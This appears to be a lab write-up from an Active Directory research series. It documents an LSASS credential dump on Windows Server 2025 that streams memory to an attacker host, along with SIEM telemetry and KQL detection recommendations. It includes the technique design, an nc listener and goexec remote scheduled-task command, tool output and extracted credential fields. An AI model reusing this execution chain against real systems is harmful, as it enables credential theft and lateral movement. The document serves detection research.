# Vector 8 — LSASS Credential Dump Without Touching Disk
## Windows Server 2025 | Build 26100.32690 | KB5082063 + KB5082417 + KB5082062

---

## On source and tooling:
This document is a detection and telemetry record. No source code, compiled tooling, or operational instructions are published alongside it. The technique is documented to the degree necessary to understand the detection surface — not to enable reproduction. Screenshots are provided as evidence of findings. The binary described here will not be shared.

## On further detection work:
The detection analysis presented here is incomplete by design. Additional work is needed to fully characterize the detection surface — including ETW signal viability, behavioral baselining of the scheduled task execution path, and validation of the EID 10 / EID 3 correlation rule under real pipeline conditions. That work requires dedicated instrumentation time that was not available within this research window. It is flagged here as the logical next step rather than left as an unacknowledged gap.

## On Credential Guard:
Credential Guard was not enabled in this environment. Where it is enabled, it raises the bar — domain credentials cached via LSASS are moved into a VSM enclave and are not accessible via direct memory reads. It does not protect all credential material in memory: local account credentials, service account material, and DPAPI keys remain outside its scope.
Virtual machine environments add a practical constraint: Credential Guard requires VBS and Hyper-V to be active. In VMware-hosted environments this requires explicit configuration and is frequently not enabled by default, meaning lab and production VM environments often run without it even where policy mandates it.
More significantly: SpecterOps published research in October 2025 demonstrating that Credential Guard, when properly enabled, can still be bypassed under specific conditions. The implication is that even environments with Credential Guard active cannot treat it as a hard boundary.
Credential Guard is a meaningful control. It is not a ceiling. 

## Environment

| Component | Details |
|-----------|---------|
| Target | WIN-52H4TKKPD9C — Windows Server 2025 Datacenter |
| Build | 10.0.26100 UBR 32690 |
| Patches | KB5082063, KB5082417, KB5082062 |
| Defender | Enabled — RTP: True |
| Signatures | 1.449.454.0 |
| Credential Guard | Not enabled |
| Attacker | Kali 192.168.1.218 |
| SIEM | Elastic Security 8.19.14 — Sysmon 15.14 + Winlogbeat 8.19.12 |

---

## Technique

Custom C# tool (`curpipe.exe`) replaces `MiniDumpWriteDump` entirely.

**Implementation:**
- Pure NTAPI memory walk — `NtOpenProcess`, `NtQueryVirtualMemory`, `NtReadVirtualMemory`
- PEB walk captures all 88 loaded modules (required for KvcForensic compatibility)
- Hand-crafted minidump assembled sequentially in `MemoryStream`
- No seeking required — all offsets pre-calculated before first byte is written
- Dump streamed directly to attacker via `TcpClient` over port 4444
- No local file written to disk
- No `MiniDumpWriteDump`
- No `dbghelp.dll`
- No `comsvcs.dll`
- No folder exclusion required

**Why this matters vs prior vectors:**

Vector 7b confirmed that `MiniDumpWriteDump` via `dbghelp.dll` produces a ~135MB dump over ~45 minutes on Server 2025, requires a Defender folder exclusion, writes to disk, and requires separate exfiltration. The bottleneck was `MiniDumpWriteDump`'s internal behavior, not disk I/O.

Removing it entirely collapses the operation from 45 minutes to 131 milliseconds.

That is not an optimization. It is a different class of problem.

Most detection pipelines are engineered around an implicit assumption: the attacker has dwell time. Batch rules run every 1–5 minutes. SIEM ingestion has latency. Correlation requires event accumulation. Human triage follows after.

At 131ms, the attack completes inside the blind spot that assumption creates. Not because detection logic was wrong — but because the detection pipeline had no opportunity to reason about the activity before it was over.

**What was avoided and why it matters:**

The surface-level observation is "no MiniDumpWriteDump, no dbghelp.dll." The more important observation is what was avoided at the behavioral level:

- No file artifact lifecycle — no creation, write, close, read sequence on the target
- No long-lived handle to lsass — opened, walked, closed in a single burst
- No repeated suspicious API cadence — one sequential pass, complete
- No dependency on commonly hooked userland paths

The result is a behavioral shape that doesn't accumulate enough signal for heuristic engines to act on before the operation is finished. This is not a bypass claim. It is a timing attack against detection pipelines, combined with low-friction execution path selection.

---

## Execution Chain

**Pre-staged:** `curpipe.exe` copied to `C:\Windows\Tasks\` via SMB. Defender does not flag the binary at rest or on execution.

**Remote execution via goexec tsch (MS-TSCH):**

```
[Kali] nc -lvnp 4444 > lsass_remote.dmp

./goexec tsch demand 192.168.1.52 \
  -u ubuntu@badsuccessor.local \
  -p '[redacted]' \
  --task '\curpipe' \
  --exec 'C:\Windows\Tasks\curpipe.exe'
```

```
11:49AM  Task registered
11:49AM  Task registered (Demand)
11:49AM  Task started successfully
11:49AM  Task deleted
```

No interactive session. No RDP. No console access to target. Task registered, executed, and deleted with no residue.

**curpipe execution output (08:49:13 UTC):**
```
[*] CurioPipeRemote - sequential minidump over TCP
[+] SeDebugPrivilege enabled
[+] OS: 10.0 build 26100
[+] lsass PID: 896
[+] lsass handle: 0x744
[+] PEB: 0x672243081216
[+] Modules found: 88
[*] Walking memory regions...
[+] Regions: 665  Bytes: 58,818,560  Walk: 29ms
[*] Building minidump...
[+] Built: 58,844,744 bytes in 50ms
[*] Sending to 192.168.1.218:4444...
[+] Sent 58,844,744 bytes in 52ms
[+] Total: 131ms
[+] Done
```

**Total operation time: 131 milliseconds.**

**The execution context matters:**

```
ParentImage:    C:\Windows\System32\svchost.exe
ParentCmdLine:  svchost.exe -k netsvcs -p -s Schedule
User:           NT AUTHORITY\SYSTEM
```

Execution via the Task Scheduler service provides a trusted parent process, a non-interactive execution context, and a SYSTEM token. This combination shifts the behavioral profile away from what most tuned detection rules are calibrated for. Many detections are implicitly engineered for attacker activity that looks interactive, lateral, or noisy. Scheduled task execution as SYSTEM does not look like any of those things. It looks like legitimate system orchestration — and that mismatch is doing quiet, heavy lifting.

---

## Credential Extraction

Dump parsed on Kali attacker machine using KvcForensic:

| Field | Value |
|-------|-------|
| Dump | lsass_remote.dmp |
| Build | 10.0.26100 |
| Sessions | 10 found |
| Modules | 88 |
| Username | ubuntu |
| Domain | WIN-52H4TKKPD9C |
| NT hash | [redacted] |
| SHA1 | [redacted] |
| DPAPI | [redacted] |
| Kerberos | Present |
| WDigest | Present |

Full credential extraction from a fully patched Server 2025 DC with Defender active and real-time protection enabled.

pypykatz 0.6.13 parses structural elements (WDIGEST, Kerberos, DPAPI) but fails MSV extraction with a struct offset error against the patched lsasrv.dll — consistent with Vector 7b findings. KvcForensic successfully extracts NT hashes via a different parsing path.

---

## Detection Telemetry

SIEM: Elastic Security 8.19.14
Telemetry: Sysmon 15.14 + Winlogbeat 8.19.12 on WIN-52H4TKKPD9C
22 custom detection rules active including dedicated LSASS access, outbound network, and binary execution rules.

### Signal inventory

| Signal | EID | Alert fired | Notes |
|--------|-----|-------------|-------|
| LSASS handle open | Sysmon 10 | No | tsch/SYSTEM execution path does not trigger configured ProcessAccess rules |
| LSASS memory reads | ETW only | No | Not captured by Sysmon — requires Microsoft-Windows-Threat-Intelligence provider |
| Outbound TCP to attacker | Sysmon 3 | No | Raw event present. Rule saturated by winlogbeat false positives |
| Task file creation | Sysmon 11 | No | Raw event present |
| Binary execution from Tasks | Sysmon 1 | Yes — +93s | Zeroed IMPHASH rule |
| Defender | — | No | Silent throughout |

### The operational failure

The system did not fail technically. It failed operationally.

Raw signals existed. EID 3 captured the outbound TCP connection to the attacker. EID 1 captured the binary execution. Correct detection logic existed — the zeroed IMPHASH rule was properly written and correctly matched the event. The alert fired.

It fired 93 seconds after the attack was complete.

That is the finding. Not the absence of logs. Not a missing rule. Not a Defender blind spot. The detection pipeline had the right telemetry and the right logic. It simply had no opportunity to act before the credential material was already on the attacker machine.

The question this raises is not "can we detect it?" The logs prove we can. The question is "can we detect it before it no longer matters?" — and the answer, with a 5-minute rule interval against a 131ms operation, is no.

### Alert that fired

**Rule:** `Sysmon - Unsigned Binary with Zeroed IMPHASH`
**Severity:** Medium (Risk score 50)
**Rule interval:** 5 minutes (`from: now-6m`)
**Event timestamp:** 08:49:13 UTC
**Alert timestamp:** 08:50:46 UTC
**Delay:** 93 seconds

**KQL:**
```kql
event.provider: "Microsoft-Windows-Sysmon" AND
event.code: "1" AND
winlog.event_data.Hashes: *IMPHASH=00000000000000000000000000000000* AND
winlog.event_data.Company: "-"
```

### Key observable from EID 1

```
Image:          C:\Windows\Tasks\curpipe.exe
ParentImage:    C:\Windows\System32\svchost.exe
ParentCmdLine:  svchost.exe -k netsvcs -p -s Schedule
User:           NT AUTHORITY\SYSTEM
IMPHASH:        00000000000000000000000000000000
Company:        -
IntegrityLevel: System
```

Binary spawned from Task Scheduler service with zeroed IMPHASH and no publisher is a high-confidence indicator combination regardless of binary name or path.

---

## Detection Recommendations

The detection gap here is not a visibility problem — it is a temporal alignment problem. The following recommendations address both the specific technique and the broader pipeline architecture.

### 1. Zeroed IMPHASH from scheduled task parent (High confidence, existing signal)

```kql
event.code: "1" AND
winlog.event_data.Hashes: *IMPHASH=00000000000000000000000000000000* AND
winlog.event_data.ParentCommandLine: *svchost* AND
winlog.event_data.ParentCommandLine: *Schedule*
```

Tighter than the generic zeroed IMPHASH rule. Scopes to the scheduled task execution context specifically.

### 2. EID 10 + EID 3 correlation — pre-correlated, streaming (High confidence, architectural requirement)

```kql
// Step 1: EID 10 — LSASS handle open
winlog.event_id: "10" AND
winlog.event_data.TargetImage: "*lsass*"

// Step 2: Correlate ProcessGuid within 5 seconds to EID 3
winlog.event_id: "3" AND
winlog.event_data.Initiated: "true" AND
NOT winlog.event_data.DestinationIp: ("192.168.1.250" OR "127.*")
```

This correlation is architecturally correct — LSASS handle followed by outbound TCP from the same process within a 5-second window is a high-confidence detection regardless of tooling. However, it requires near-real-time streaming evaluation. A 5-minute rule interval means the correlation window closes before the rule runs. This is a pipeline architecture problem, not a query problem.

### 3. Fix the false positive masking the outbound TCP signal

The `Sysmon - Outbound Network Connection from Windows Tasks Binary` rule was generating 198 alerts per cycle — all from winlogbeat, which resides in `C:\Windows\Tasks\`. The real signal (curpipe TCP to attacker) was present in telemetry and invisible behind the noise.

Add exclusion:
```kql
NOT (winlog.event_data.Image: "*winlogbeat*" AND
     winlog.event_data.DestinationIp: "192.168.1.250")
```

### 4. ETW — Microsoft-Windows-Threat-Intelligence provider

`NtReadVirtualMemory` call volume against lsass during a memory walk is extremely high — hundreds of calls in under 30ms. This is visible at the kernel level via the `Microsoft-Windows-Threat-Intelligence` ETW provider, which is the mechanism commercial EDRs use for LSASS protection. This signal is not available via standard Sysmon configuration and represents the highest-confidence detection path against this class of technique. Quantifying signal-to-noise and verifying whether a 131ms burst remains visible is a direction for future research.

---

## Timeline

```
08:49:13.272  Task \curpipe registered by goexec (Sysmon EID 11)
08:49:13.282  curpipe.exe spawned by Task Scheduler svchost (Sysmon EID 1)
              SeDebugPrivilege enabled
              lsass handle opened via NtOpenProcess
08:49:13.3xx  Memory walk — 665 regions, 58,818,560 bytes — 29ms
08:49:13.3xx  Minidump assembled in MemoryStream — 50ms
08:49:13.531  Outbound TCP established to 192.168.1.218:4444 (Sysmon EID 3)
              58,844,744 bytes sent — 52ms
              NT hash, DPAPI, Kerberos material received on Kali
08:49:13.5xx  KvcForensic extracts NT hash from lsass_remote.dmp

              [ attack complete — 131ms total ]

08:50:46.501  FIRST ALERT — Zeroed IMPHASH rule fires
              Delay: 93 seconds after completion
```

---

## Parser Notes

KvcForensic (wesmar) successfully parses the dump and extracts NT hashes on Server 2025 build 26100 post-KB5082063. pypykatz 0.6.13 parses structural elements (WDIGEST, Kerberos, DPAPI) but fails MSV extraction with a struct offset error against the patched lsasrv.dll — consistent with Vector 7b findings.

Dump structure: 3 streams (SystemInfo, ModuleList, Memory64List), 88 modules captured via PEB walk, 665 memory regions, 58,844,744 bytes total.

---

## Source

Research series: [osherjacobs/AD-Lab-Research](https://github.com/osherjacobs/AD-Lab-Research)

No tooling or source code published. Screenshots only.

<img width="1872" height="644" alt="ATTACKREMOTEredacted" src="https://github.com/user-attachments/assets/37e728c2-fb30-41f3-b649-f793f19c7f32" />

<img width="938" height="680" alt="2026-05-05_09-22" src="https://github.com/user-attachments/assets/e14deffd-63a0-4e36-bd75-4718b27978b2" />

<img width="1823" height="994" alt="ELASTICBINARYALERT" src="https://github.com/user-attachments/assets/e5e486b1-a770-489f-a237-b51db17e77b4" />









